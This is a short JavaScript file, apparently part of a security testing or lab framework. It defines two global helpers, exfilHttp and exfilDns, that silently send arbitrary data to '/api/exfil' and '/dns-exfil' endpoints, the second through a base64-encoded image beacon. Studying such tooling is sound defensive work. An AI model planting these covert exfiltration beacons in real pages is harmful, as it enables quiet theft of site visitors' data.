(function () {
  'use strict';

  function b64EncodeUnicode(str) {
    try {
      return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function (match, p1) {
        return String.fromCharCode('0x' + p1);
      }));
    } catch (e) {
      return btoa(str);
    }
  }

  window.exfilHttp = function (token, data) {
    try {
      fetch('/api/exfil/' + encodeURIComponent(token), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).catch(function () {});
    } catch (e) {}
  };

  window.exfilDns = function (token, data) {
    try {
      var encoded = b64EncodeUnicode(JSON.stringify(data));
      var img = new Image();
      img.src = '/dns-exfil?token=' + encodeURIComponent(token) + '&data=' + encodeURIComponent(encoded);
    } catch (e) {}
  };
})();
